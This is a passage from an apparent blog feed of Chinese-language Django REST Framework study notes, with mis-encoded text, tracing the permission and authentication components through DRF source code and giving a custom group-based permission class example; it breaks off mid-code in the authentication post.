class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initial</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Runs anything that needs to occur prior to calling the method handler.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.format_kwarg = self.get_format_suffix(**kwargs)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Perform content negotiation and store the accepted info on the request</span></span><br><span class="line">        neg = self.perform_content_negotiation(request)</span><br><span class="line">        request.accepted_renderer, request.accepted_media_type = neg</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Determine the API version, if versioning is in use.</span></span><br><span class="line">        version, scheme = self.determine_version(request, *args, **kwargs)</span><br><span class="line">        request.version, request.versioning_scheme = version, scheme</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Ensure that the incoming request is permitted</span></span><br><span class="line">        self.perform_authentication(request) </span><br><span class="line">        self.check_permissions(request)  <span class="comment"># æƒé™</span></span><br><span class="line">        self.check_throttles(request)</span><br></pre></td></tr></table></figure><h2 id="rest-framework-views-APIView-check-permissions"><a href="#rest-framework-views-APIView-check-permissions" class="headerlink" title="rest_framework.views.APIView.check_permissions()"></a>rest_framework.views.APIView.check_permissions()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_permissions</span><span class="params">(self, request)</span>:</span></span><br><span class="line">    <span class="comment"># éå†æƒé™å¯¹è±¡åˆ—è¡¨å¾—åˆ°ä¸€ä¸ªä¸ªæƒé™å¯¹è±¡(æƒé™å™¨)ï¼Œè¿›è¡Œæƒé™è®¤è¯</span></span><br><span class="line">    <span class="keyword">for</span> permission <span class="keyword">in</span> self.get_permissions():</span><br><span class="line">        <span class="comment"># æƒé™ç±»ä¸€å®šæœ‰ä¸€ä¸ªhas_permissionæƒé™æ–¹æ³•ï¼Œç”¨æ¥åšæƒé™è®¤è¯çš„</span></span><br><span class="line">        <span class="comment"># å‚æ•°ï¼šæƒé™å¯¹è±¡selfã€è¯·æ±‚å¯¹è±¡requestã€è§†å›¾ç±»å¯¹è±¡</span></span><br><span class="line">        <span class="comment"># è¿”å›å€¼ï¼šæœ‰æƒé™è¿”å›Trueï¼Œæ— æƒé™è¿”å›False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> permission.has_permission(request, self):</span><br><span class="line">            self.permission_denied(</span><br><span class="line">                request, message=getattr(permission, <span class="string">'message'</span>, <span class="literal">None</span>)</span><br><span class="line">            )</span><br></pre></td></tr></table></figure><h2 id="rest-framework-views-APIView-get-permissions"><a href="#rest-framework-views-APIView-get-permissions" class="headerlink" title="rest_framework.views.APIView.get_permissions()"></a>rest_framework.views.APIView.get_permissions()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_permissions</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Instantiates and returns the list of permissions that this view requires.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> [permission() <span class="keyword">for</span> permission <span class="keyword">in</span> self.permission_classes]</span><br></pre></td></tr></table></figure><h2 id="rest-framework-views-permission-classes"><a href="#rest-framework-views-permission-classes" class="headerlink" title="rest_framework.views.permission_classes"></a>rest_framework.views.permission_classes</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">permission_classes = api_settings.DEFAULT_PERMISSION_CLASSES</span><br></pre></td></tr></table></figure><h2 id="api-settings-DEFAULT-PERMISSION-CLASSES"><a href="#api-settings-DEFAULT-PERMISSION-CLASSES" class="headerlink" title="api_settings.DEFAULT_PERMISSION_CLASSES"></a>api_settings.DEFAULT_PERMISSION_CLASSES</h2><p>æŒ‡å‘ <code>settings.DEFAULTS</code>çš„<code>DEFAULT_PERMISSION_CLASSES</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DEFAULTS = &#123;</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="string">'DEFAULT_PERMISSION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.permissions.AllowAny'</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure><h2 id="pemissions-py"><a href="#pemissions-py" class="headerlink" title="pemissions.py"></a>pemissions.py</h2><p>åœ¨æºç <code>permissions.py</code>ä¸­çš„ç³»ç»Ÿè‡ªå¸¦æƒé™ç±»ï¼Œè¿™é‡Œä¸¾ä¾‹å››ä¸ª</p><ol><li><p><code>AllowAny</code></p><ul><li>é»˜è®¤æ˜¯è¿™ä¸ªæƒé™</li><li>è®¤è¯è§„åˆ™å…¨éƒ¨è¿”è¿˜<code>True</code>ï¼š<code>return True</code></li><li>æ¸¸å®¢ä¸ç™»é™†ç”¨æˆ·éƒ½æœ‰æ‰€æœ‰æƒé™</li></ul></li><li><p>IsAuthenticated</p><ul><li>å¸¸ç”¨è¿™ä¸ª</li><li>è®¤è¯è§„åˆ™å¿…é¡»æœ‰ç™»é™†çš„åˆæ³•ç”¨æˆ·ï¼š<code>return bool(request.user and request.user.is_authenticated)</code></li><li>æœ‰ç™»å½•ç”¨æˆ·åå¹¶ä¸”è®¤è¯æˆåŠŸ</li><li>æ¸¸å®¢æ²¡æœ‰ä»»ä½•æƒé™ï¼Œç™»é™†ç”¨æˆ·æ‰æœ‰æƒé™</li></ul></li><li><p>IsAdminUser</p><ul><li>è®¤è¯è§„åˆ™å¿…é¡»æ˜¯åå°ç®¡ç†ç”¨æˆ·ï¼š<code>return bool(request.user and request.user.is_staff)</code></li><li>æ¸¸å®¢æ²¡æœ‰ä»»ä½•æƒé™ï¼Œç™»é™†ç”¨æˆ·æ‰æœ‰æƒé™</li></ul></li><li><p>IsAuthenticatedOrReadOnly</p><ul><li>è®¤è¯è§„åˆ™å¿…é¡»æ˜¯åªè¯»è¯·æ±‚æˆ–æ˜¯åˆæ³•ç”¨æˆ·  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> bool(</span><br><span class="line">    request.method <span class="keyword">in</span> SAFE_METHODS <span class="keyword">or</span></span><br><span class="line">    request.user <span class="keyword">and</span></span><br><span class="line">    request.user.is_authenticated</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li>æ¸¸å®¢åªè¯»ï¼Œåˆæ³•ç”¨æˆ·æ— é™åˆ¶</li></ul></li></ol><p>å¦å¤–ï¼Œ<code>permission.py</code>é‡Œè¿˜å®šä¹‰äº†å®‰å…¨çš„HTTPè¯·æ±‚æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SAFE_METHODS = (<span class="string">'GET'</span>, <span class="string">'HEAD'</span>, <span class="string">'OPTIONS'</span>)</span><br></pre></td></tr></table></figure><h1 id="æƒé™ç»„ä½¿ç”¨"><a href="#æƒé™ç»„ä½¿ç”¨" class="headerlink" title="æƒé™ç»„ä½¿ç”¨"></a>æƒé™ç»„ä½¿ç”¨</h1><h2 id="å…¨å±€ä½¿ç”¨"><a href="#å…¨å±€ä½¿ç”¨" class="headerlink" title="å…¨å±€ä½¿ç”¨"></a>å…¨å±€ä½¿ç”¨</h2><p>é»˜è®¤å…¨å±€é…ç½®çš„æƒé™ç±»æ˜¯<code>AllowAny</code>ï¼Œåœ¨<code>settings</code>æ–‡ä»¶ä¸­é…ç½®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># æƒé™ç±»é…ç½®</span></span><br><span class="line">    <span class="string">'DEFAULT_PERMISSION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'rest_framework.permissions.AllowAny'</span>,   <span class="comment">#é»˜è®¤æ‰€æœ‰æƒé™</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å±€éƒ¨ä½¿ç”¨"><a href="#å±€éƒ¨ä½¿ç”¨" class="headerlink" title="å±€éƒ¨ä½¿ç”¨"></a>å±€éƒ¨ä½¿ç”¨</h2><p><code>views.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åªæœ‰ç™»å½•åæ‰èƒ½è®¿é—®</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestAuthenticatedAPIView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    permission_classes = [IsAuthenticated]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'test ç™»å½•æ‰èƒ½è®¿é—®çš„æ¥å£ ok'</span>)</span><br></pre></td></tr></table></figure><h1 id="è‡ªå®šä¹‰æƒé™ç±»"><a href="#è‡ªå®šä¹‰æƒé™ç±»" class="headerlink" title="è‡ªå®šä¹‰æƒé™ç±»"></a>è‡ªå®šä¹‰æƒé™ç±»</h1><h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>1) åˆ›å»ºç»§æ‰¿BasePermissionçš„æƒé™ç±»<br>2) å®ç°has_permissionæ–¹æ³•<br>3) å®ç°ä½“æ ¹æ®æƒé™è§„åˆ™ ç¡®å®šæœ‰æ— æƒé™</p><ul><li>æ»¡è¶³è®¾ç½®çš„ç”¨æˆ·æ¡ä»¶ï¼Œä»£è¡¨æœ‰æƒé™ï¼Œè¿”å›True</li><li>ä¸æ»¡è¶³è®¾ç½®çš„ç”¨æˆ·æ¡ä»¶ï¼Œä»£è¡¨æœ‰æƒé™ï¼Œè¿”å›False<br>4) è¿›è¡Œå…¨å±€æˆ–å±€éƒ¨é…ç½®</li></ul><h2 id="ç¤ºä¾‹ä»£ç "><a href="#ç¤ºä¾‹ä»£ç " class="headerlink" title="ç¤ºä¾‹ä»£ç "></a>ç¤ºä¾‹ä»£ç </h2><h3 id="utils-permissions-py"><a href="#utils-permissions-py" class="headerlink" title="utils.permissions.py"></a>utils.permissions.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> BasePermission</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> Group</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPermission</span><span class="params">(BasePermission)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">has_permission</span><span class="params">(self, request, view)</span>:</span></span><br><span class="line">        <span class="comment"># åªè¯»æ¥å£åˆ¤æ–­</span></span><br><span class="line">        r1 = request.method <span class="keyword">in</span> (<span class="string">'GET'</span>, <span class="string">'HEAD'</span>, <span class="string">'OPTIONS'</span>)</span><br><span class="line">        <span class="comment"># groupä¸ºæœ‰æƒé™çš„åˆ†ç»„</span></span><br><span class="line">        group = Group.objects.filter(name=<span class="string">'ç®¡ç†å‘˜'</span>).first()</span><br><span class="line">        <span class="comment"># groupsä¸ºå½“å‰ç”¨æˆ·æ‰€å±çš„æ‰€æœ‰åˆ†ç»„</span></span><br><span class="line">        groups = request.user.groups.all()</span><br><span class="line">        r2 = group <span class="keyword">and</span> groups <span class="comment"># groupå’Œgroupså¿…é¡»æœ‰å€¼</span></span><br><span class="line">        r3 = group <span class="keyword">in</span> groups</span><br><span class="line">        <span class="comment"># è¯»æ¥å£å¤§å®¶éƒ½æœ‰æƒé™ï¼Œå†™æ¥å£å¿…é¡»ä¸ºæŒ‡å®šåˆ†ç»„ä¸‹çš„ç™»é™†ç”¨æˆ·</span></span><br><span class="line">        <span class="keyword">return</span> r1 <span class="keyword">or</span> (r2 <span class="keyword">and</span> r3)</span><br></pre></td></tr></table></figure><h3 id="views-py"><a href="#views-py" class="headerlink" title="views.py"></a>views.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> utils.permissions <span class="keyword">import</span> MyPermission</span><br><span class="line"><span class="keyword">from</span> utils.response <span class="keyword">import</span> APIResponse</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¸¸å®¢åªè¯»ï¼Œç™»å½•ç”¨æˆ·åªè¯»ï¼Œåªæœ‰ç™»å½•ç”¨æˆ·å±äº ç®¡ç†å‘˜ åˆ†ç»„ï¼Œæ‰å¯ä»¥å¢åˆ æ”¹</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestAdminOrReadOnlyAPIView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    permission_classes = [MyPermission]</span><br><span class="line">    <span class="comment"># æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥è®¿é—®</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'è‡ªå®šä¹‰è¯» OK'</span>)</span><br><span class="line">    <span class="comment"># å¿…é¡»æ˜¯ è‡ªå®šä¹‰â€œç®¡ç†å‘˜â€åˆ†ç»„ ä¸‹çš„ç”¨æˆ·</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'è‡ªå®šä¹‰å†™ OK'</span>)</span><br></pre></td></tr></table></figure><h3 id="urls-py"><a href="#urls-py" class="headerlink" title="urls.py"></a>urls.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'test3/'</span>, views.TestAdminOrReadOnlyAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="Postmanæµ‹è¯•"><a href="#Postmanæµ‹è¯•" class="headerlink" title="Postmanæµ‹è¯•"></a>Postmanæµ‹è¯•</h2><ul><li><code>get</code>è¯·æ±‚ï¼šåŠ ä¸åŠ <code>Authorization</code>ï¼Œéƒ½å¯ä»¥è¯»</li><li><code>post</code>è¯·æ±‚ï¼šä¸åŠ <code>Authorization</code>ï¼Œå°±ä¸èƒ½è¿›è¡Œå†™æ“ä½œï¼Œå¿…é¡»è¦å†™<code>Authorization</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Backend </tag>
            
            <tag> Django </tag>
            
            <tag> Django REST Framework </tag>
            
            <tag> DRF </tag>
            
            <tag> Learning Notes </tag>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django REST Framework å­¦ä¹ ç¬”è®°ï¼ˆåä¸€ï¼‰ï¼šè®¤è¯ç»„ä»¶</title>
      <link href="/tech/drf-learning-notes-11-authentication/"/>
      <url>/tech/drf-learning-notes-11-authentication/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Django REST Framework Learning Notes (11): Authentication</strong></em></li><li>Author: dog2</li></ul><hr><h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><ul><li>æºç  <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvYXV0aGVudGljYXRpb24ucHk=">rest_framework.authentication<i class="fa fa-external-link-alt"></i></span></li><li>å®˜æ–¹æ–‡æ¡£ <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvYXV0aGVudGljYXRpb24v">API Guild - Authentication<i class="fa fa-external-link-alt"></i></span></li><li>æœ¬æ–‡demoä»£ç Github<ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzExX2RyZl9hdXRoZW50aWNhdGlvbi8=">è‡ªå®šä¹‰è®¤è¯ç±»<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzExX2RyZl9qd3Qv">jwt &amp; simple-jwt<i class="fa fa-external-link-alt"></i></span></li></ul></li></ul><a id="more"></a><h1 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h1><h2 id="å…¥å£"><a href="#å…¥å£" class="headerlink" title="å…¥å£"></a>å…¥å£</h2><p>ä»<code>rest_framework.views.APIView</code>çš„<code>dispath(self, request, *args, **kwargs)</code>ä¸‹æ‰‹<br>ï¼Œ<code>dispath</code>æ–¹æ³•å†… <code>self.initial(request, *args, **kwargs)</code> è¿›å…¥ä¸‰å¤§è®¤è¯</p><ul><li>è®¤è¯ç»„ä»¶ <code>self.perform_authentication(request)</code><ul><li>æ ¡éªŒç”¨æˆ·ï¼šæ¸¸å®¢ã€åˆæ³•ç”¨æˆ·ã€éæ³•ç”¨æˆ·</li><li>æ¸¸å®¢ï¼šä»£è¡¨æ ¡éªŒé€šè¿‡ï¼Œç›´æ¥è¿›å…¥ä¸‹ä¸€æ­¥æ ¡éªŒï¼ˆæƒé™æ ¡éªŒï¼‰</li><li>åˆæ³•ç”¨æˆ·ï¼šä»£è¡¨æ ¡éªŒé€šè¿‡ï¼Œå°†ç”¨æˆ·å­˜å‚¨åœ¨<code>request.user</code>ä¸­ï¼Œå†è¿›å…¥ä¸‹ä¸€æ­¥æ ¡éªŒï¼ˆæƒé™æ ¡éªŒï¼‰</li><li>éæ³•ç”¨æˆ·ï¼šä»£è¡¨æ ¡éªŒå¤±è´¥ï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼Œè¿”å›403æƒé™å¼‚å¸¸ç»“æœ</li></ul></li><li>æƒé™ç»„ä»¶ <code>self.check_permissions(request)</code><ul><li>æ ¡éªŒç”¨æˆ·æƒé™ï¼šå¿…é¡»ç™»å½•ã€æ‰€æœ‰ç”¨æˆ·ã€ç™»å½•ä¹‹åè¯»å†™ï¼Œæ¸¸å®¢åªè¯»ã€è‡ªå®šä¹‰ç”¨æˆ·è§’è‰²</li><li>è®¤è¯é€šè¿‡ï¼šå¯ä»¥è¿›å…¥ä¸‹ä¸€æ­¥æ ¡éªŒï¼ˆé¢‘ç‡è®¤è¯ï¼‰</li><li>è®¤è¯å¤±è´¥ï¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè¿”å›403æƒé™å¼‚å¸¸ç»“æœ</li></ul></li><li>é¢‘ç‡ç»„ä»¶ <code>self.check_throttles(request)</code><ul><li>é™åˆ¶è§†å›¾æ¥å£è¢«è®¿é—®çš„é¢‘ç‡æ¬¡æ•° - é™åˆ¶çš„æ¡ä»¶(IPã€idã€å”¯ä¸€é”®)ã€é¢‘ç‡å‘¨æœŸæ—¶é—´(sã€mã€h)ã€é¢‘ç‡çš„æ¬¡æ•°ï¼ˆ3/sï¼‰</li><li>æ²¡æœ‰è¾¾åˆ°é™æ¬¡ï¼šæ­£å¸¸è®¿é—®æ¥å£</li><li>è¾¾åˆ°é™æ¬¡ï¼šé™åˆ¶æ—¶é—´å†…ä¸èƒ½è®¿é—®ï¼Œé™åˆ¶æ—¶é—´è¾¾åˆ°åï¼Œå¯ä»¥é‡æ–°è®¿é—®</li></ul></li></ul><p>æœ¬æ–‡ä»‹ç»è®¤è¯ç»„ä»¶ã€‚</p><h2 id="rest-framework-views-APIView-initial"><a href="#rest-framework-views-APIView-initial" class="headerlink" title="rest_framework.views.APIView.initial()"></a>rest_framework.views.APIView.initial()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initial</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Runs anything that needs to occur prior to calling the method handler.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.format_kwarg = self.get_format_suffix(**kwargs)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Perform content negotiation and store the accepted info on the request</span></span><br><span class="line">        neg = self.perform_content_negotiation(request)</span><br><span class="line">        request.accepted_renderer, request.accepted_media_type = neg</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Determine the API version, if versioning is in use.</span></span><br><span class="line">        version, scheme = self.determine_version(request, *args, **kwargs)</span><br><span class="line">        request.version, request.versioning_scheme = version, scheme</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Ensure that the incoming request is permitted</span></span><br><span class="line">        self.perform_authentication(request)  <span class="comment">#è®¤è¯</span></span><br><span class="line">        self.check_permissions(request)  <span class="comment">#æƒé™</span></span><br><span class="line">        self.check_throttles(request)  <span class="comment">#é¢‘ç‡</span></span><br></pre></td></tr></table></figure><h2 id="rest-framework-views-APIView-perform-authentication"><a href="#rest-framework-views-APIView-perform-authentication" class="headerlink" title="rest_framework.views.APIView.perform_authentication()"></a>rest_framework.views.APIView.perform_authentication()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">perform_authentication</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Perform authentication on the incoming request.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Note that if you override this and simply 'pass', then authentication</span></span><br><span class="line"><span class="string">        will instead be performed lazily, the first time either</span></span><br><span class="line"><span class="string">        `request.user` or `request.auth` is accessed.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        request.user</span><br></pre></td></tr></table></figure><h2 id="rest-framework-request-Request-user"><a href="#rest-framework-request-Request-user" class="headerlink" title="rest_framework.request.Request.user"></a>rest_framework.request.Request.user</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@property</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Returns the user associated with the current request, as authenticated</span></span><br><span class="line"><span class="string">    by the authentication classes provided to the request.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> hasattr(self, <span class="string">'_user'</span>):</span><br><span class="line">        <span class="keyword">with</span> wrap_attributeerrors():</span><br><span class="line">            self._authenticate()</span><br><span class="line">    <span class="keyword">return</span> self._user</span><br></pre></td></tr></table></figure><h2 id="rest-framework-request-Request-authenticate"><a href="#rest-framework-request-Request-authenticate" class="headerlink" title="rest_framework.request.Request._authenticate()"></a>rest_framework.request.Request._authenticate()</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åšè®¤è¯</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_authenticate</span><span class="params">(self)</span>:</span>  <span class="comment">#è¿™é‡Œçš„selfå°±æ˜¯request</span></span><br><span class="line">    <span class="comment"># éå†æ‹¿åˆ°ä¸€ä¸ªä¸ªè®¤è¯å™¨ï¼Œè¿›è¡Œè®¤è¯</span></span><br><span class="line">    <span class="comment"># self.authenticatorsé…ç½®çš„ä¸€å †è®¤è¯ç±»äº§ç”Ÿçš„è®¤è¯ç±»å¯¹è±¡ç»„æˆçš„ list</span></span><br><span class="line">ã€€ã€€ã€€ã€€ <span class="comment"># å³ï¼š[auth() for auth in self.authentication_classes]</span></span><br><span class="line">    <span class="keyword">for</span> authenticator <span class="keyword">in</span> self.authenticators:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># è®¤è¯å™¨(å¯¹è±¡)è°ƒç”¨è®¤è¯æ–¹æ³•authenticate(è®¤è¯ç±»å¯¹è±¡self, requestè¯·æ±‚å¯¹è±¡)</span></span><br><span class="line">            <span class="comment"># è¿”å›å€¼ï¼šç™»é™†çš„ç”¨æˆ·ä¸è®¤è¯çš„ä¿¡æ¯ç»„æˆçš„ tuple</span></span><br><span class="line">            <span class="comment"># è¯¥æ–¹æ³•è¢«tryåŒ…è£¹ï¼Œä»£è¡¨è¯¥æ–¹æ³•ä¼šæŠ›å¼‚å¸¸ï¼ŒæŠ›å¼‚å¸¸å°±ä»£è¡¨è®¤è¯å¤±è´¥</span></span><br><span class="line">            user_auth_tuple = authenticator.authenticate(self)</span><br><span class="line">        <span class="keyword">except</span> exceptions.APIException:</span><br><span class="line">            self._not_authenticated()</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¿”å›å€¼çš„å¤„ç†</span></span><br><span class="line">        <span class="keyword">if</span> user_auth_tuple <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self._authenticator = authenticator</span><br><span class="line">            <span class="comment"># å¦‚ä½•æœ‰è¿”å›å€¼ï¼Œå°±å°† ç™»é™†ç”¨æˆ· ä¸ ç™»é™†è®¤è¯ åˆ†åˆ«ä¿å­˜åˆ° 